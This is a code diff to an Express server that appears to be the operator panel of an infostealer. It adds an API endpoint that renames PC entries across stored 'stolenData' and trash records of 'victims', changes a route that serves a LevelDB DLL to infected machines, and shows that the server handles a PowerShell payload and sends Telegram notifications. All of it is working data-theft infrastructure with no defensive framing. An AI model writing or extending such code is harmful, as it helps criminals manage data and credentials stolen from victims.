@@ -5,6 +5,7 @@
 // Fixed: Handles PowerShell payload with PC name
 // Clean URLs: NO .php in address bar — serves directly
 // LocalStorage: Supports new localStorage field from payload
+// Rename PC: API endpoint to rename PC across all victims
 // ============================================================
 
 const express = require('express');
@@ -706,6 +707,67 @@ app.post('/api/config/telegram', requireAuth, (req, res) => {
     res.json({ status: 'ok', message: 'Telegram settings updated successfully' });
 });
 
+// ---- RENAME PC - NEW API ENDPOINT ----
+app.post('/api/rename-pc', requireAuth, (req, res) => {
+    const { oldName, newName } = req.body;
+
+    if (!oldName || !newName) {
+        return res.status(400).json({
+            status: 'error',
+            message: 'Old and new PC names are required'
+        });
+    }
+
+    if (oldName === newName) {
+        return res.json({
+            status: 'ok',
+            message: 'No changes made',
+            updated: 0
+        });
+    }
+
+    let updatedMain = 0;
+    let updatedTrash = 0;
+
+    // Update in stolenData
+    stolenData.forEach(entry => {
+        const pc = entry.pcName || entry.fingerprint?.hostname || entry.ip || 'Unknown PC';
+        if (pc === oldName) {
+            entry.pcName = newName;
+            updatedMain++;
+        }
+    });
+
+    // Update in trashData
+    trashData.forEach(entry => {
+        const pc = entry.pcName || entry.fingerprint?.hostname || entry.ip || 'Unknown PC';
+        if (pc === oldName) {
+            entry.pcName = newName;
+            updatedTrash++;
+        }
+    });
+
+    if (updatedMain === 0 && updatedTrash === 0) {
+        return res.status(404).json({
+            status: 'error',
+            message: 'No victims found with that PC name'
+        });
+    }
+
+    // Save both files
+    saveData(DATA_FILE, stolenData);
+    saveData(TRASH_FILE, trashData);
+
+    log(`[+] Renamed PC: "${oldName}" → "${newName}" (${updatedMain} victims, ${updatedTrash} in trash)`);
+
+    res.json({
+        status: 'ok',
+        message: `Renamed ${updatedMain} victims from "${oldName}" to "${newName}"`,
+        updated: updatedMain,
+        updatedTrash: updatedTrash
+    });
+});
+
 // ============================================================
 // FRONTEND ROUTES — CLEAN URLS (NO .php IN ADDRESS BAR)
 // ============================================================
@@ -747,8 +809,8 @@ app.get('/System.Data.SQLite.dll', (req, res) => {
     res.sendFile(path.join(__dirname, 'public', 'System.Data.SQLite.dll'));
 });
 
-app.get('/LevelDB.NET.dll', (req, res) => {
-    res.sendFile(path.join(__dirname, 'public', 'LevelDB.NET.dll'));
+app.get('/LevelDB.netAll.dll', (req, res) => {
+    res.sendFile(path.join(__dirname, 'public', 'LevelDB.netAll.dll'));
 });
 
 app.get('/leveldb.dll', (req, res) => {
@@ -878,6 +940,7 @@ app.listen(PORT, '0.0.0.0', () => {
     console.log(`  [+] Telegram: ${CONFIG.SEND_NOTIFICATIONS ? 'ENABLED ✅' : 'DISABLED ❌'}`);
     console.log(`  [+] Clean URLs: ENABLED ✅ (no .php in address bar)`);
     console.log(`  [+] LocalStorage: ENABLED ✅ (from payload)`);
+    console.log(`  [+] Rename PC: ENABLED ✅ (/api/rename-pc)`);
     console.log('='.repeat(55) + '\n');
 });
 
